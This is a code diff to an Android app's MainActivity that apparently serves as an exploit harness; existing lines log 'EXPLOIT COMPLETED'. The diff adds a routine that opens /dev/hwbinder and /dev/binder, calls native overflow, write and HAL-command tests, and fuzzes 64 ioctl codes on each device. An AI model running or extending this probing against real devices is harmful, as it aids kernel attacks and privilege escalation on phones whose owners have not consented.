@@ -274,6 +274,10 @@ public class MainActivity extends AppCompatActivity {
         appendLog("[*] ID command capture via /proc/self/exe and /proc/self/status");
         testIdCommand();
 
+        // ***** 新增：binder/hwbinder 多角度访问检查 *****
+        appendLog("[*] Binder/HwBinder comprehensive access check");
+        testBinderHwbinderCheck();
+
         appendLog("========== EXPLOIT COMPLETED ==========");
         appendLog("========================================");
         updateStatus("Done");
@@ -1104,6 +1108,99 @@ public class MainActivity extends AppCompatActivity {
         }
 
         appendLog("[ID] === end ===");
+    }
+
+    // ***** 新增：binder/hwbinder 综合访问检查 *****
+    private void testBinderHwbinderCheck() {
+        appendLog("[BINDER_HWBINDER_CHECK] Starting comprehensive binder/hwbinder access checks...");
+
+        // 测试 /dev/hwbinder
+        int hwbinderFd = nativeOpenDevice("/dev/hwbinder");
+        if (hwbinderFd >= 0) {
+            appendLog("[BINDER_HWBINDER_CHECK] /dev/hwbinder opened fd=" + hwbinderFd);
+
+            // 现有测试函数复用
+            String version = nativeBinderGetVersion(hwbinderFd);
+            appendLog("[BINDER_HWBINDER_CHECK] Version: " + version);
+
+            String adv = nativeBinderAdvancedTest(hwbinderFd);
+            appendLog("[BINDER_HWBINDER_CHECK] Advanced: " + adv);
+
+            String overflow = nativeHwbinderOverflowTest(hwbinderFd);
+            appendLog("[BINDER_HWBINDER_CHECK] Overflow: " + overflow);
+
+            String write = nativeHwbinderWriteTest(hwbinderFd);
+            appendLog("[BINDER_HWBINDER_CHECK] Write: " + write);
+
+            String hal = nativeHwbinderHalCommand(hwbinderFd);
+            appendLog("[BINDER_HWBINDER_CHECK] HAL: " + hal);
+
+            String read = nativeHwbinderReadTest(hwbinderFd);
+            appendLog("[BINDER_HWBINDER_CHECK] Read: " + read);
+
+            // 多种 ioctl 命令（已知及随机组合）
+            int[] testCmds = {
+                0x40046201, 0x40046202, 0x40046203, 0x40046204, 0x40046205,
+                0x40046206, 0x40046207, 0x40046208, 0x40046209, 0x4004620A,
+                0x4004620B, 0x4004620C, 0x4004620D, 0x4004620E, 0x4004620F,
+                0x40046210, 0x60046201, 0x60046202, 0x60046203, 0x60046204,
+                0x60046205, 0x60046206, 0x60046207, 0x60046208, 0x60046209,
+                0x6004620A, 0x6004620B, 0x6004620C, 0x6004620D, 0x6004620E,
+                0x6004620F, 0x60046210, 0x80046201, 0x80046202, 0x80046203,
+                0x80046204, 0x80046205, 0x80046206, 0x80046207, 0x80046208,
+                0x80046209, 0x8004620A, 0x8004620B, 0x8004620C, 0x8004620D,
+                0x8004620E, 0x8004620F, 0x80046210, 0xC0046201, 0xC0046202,
+                0xC0046203, 0xC0046204, 0xC0046205, 0xC0046206, 0xC0046207,
+                0xC0046208, 0xC0046209, 0xC004620A, 0xC004620B, 0xC004620C,
+                0xC004620D, 0xC004620E, 0xC004620F, 0xC0046210
+            };
+            for (int cmd : testCmds) {
+                String result = nativeBinderIoctlTest(hwbinderFd, cmd, 0);
+                appendLog("[BINDER_HWBINDER_CHECK] hwbinder ioctl(0x" + Integer.toHexString(cmd) + ") = " + result);
+            }
+
+            try { ParcelFileDescriptor.adoptFd(hwbinderFd).close(); } catch (Exception e) {}
+        } else {
+            appendLog("[BINDER_HWBINDER_CHECK] /dev/hwbinder open failed: " + hwbinderFd);
+        }
+
+        // 测试 /dev/binder
+        int binderFd = nativeOpenDevice("/dev/binder");
+        if (binderFd >= 0) {
+            appendLog("[BINDER_HWBINDER_CHECK] /dev/binder opened fd=" + binderFd);
+
+            String version = nativeBinderGetVersion(binderFd);
+            appendLog("[BINDER_HWBINDER_CHECK] binder Version: " + version);
+
+            String adv = nativeBinderAdvancedTest(binderFd);
+            appendLog("[BINDER_HWBINDER_CHECK] binder Advanced: " + adv);
+
+            int[] testCmds = {
+                0x40046201, 0x40046202, 0x40046203, 0x40046204, 0x40046205,
+                0x40046206, 0x40046207, 0x40046208, 0x40046209, 0x4004620A,
+                0x4004620B, 0x4004620C, 0x4004620D, 0x4004620E, 0x4004620F,
+                0x40046210, 0x60046201, 0x60046202, 0x60046203, 0x60046204,
+                0x60046205, 0x60046206, 0x60046207, 0x60046208, 0x60046209,
+                0x6004620A, 0x6004620B, 0x6004620C, 0x6004620D, 0x6004620E,
+                0x6004620F, 0x60046210, 0x80046201, 0x80046202, 0x80046203,
+                0x80046204, 0x80046205, 0x80046206, 0x80046207, 0x80046208,
+                0x80046209, 0x8004620A, 0x8004620B, 0x8004620C, 0x8004620D,
+                0x8004620E, 0x8004620F, 0x80046210, 0xC0046201, 0xC0046202,
+                0xC0046203, 0xC0046204, 0xC0046205, 0xC0046206, 0xC0046207,
+                0xC0046208, 0xC0046209, 0xC004620A, 0xC004620B, 0xC004620C,
+                0xC004620D, 0xC004620E, 0xC004620F, 0xC0046210
+            };
+            for (int cmd : testCmds) {
+                String result = nativeBinderIoctlTest(binderFd, cmd, 0);
+                appendLog("[BINDER_HWBINDER_CHECK] binder ioctl(0x" + Integer.toHexString(cmd) + ") = " + result);
+            }
+
+            try { ParcelFileDescriptor.adoptFd(binderFd).close(); } catch (Exception e) {}
+        } else {
+            appendLog("[BINDER_HWBINDER_CHECK] /dev/binder open failed: " + binderFd);
+        }
+
+        appendLog("[BINDER_HWBINDER_CHECK] Check completed.");
     }
 
     private List<File> listFilesRecursive(File dir, int depth, int maxDepth) {
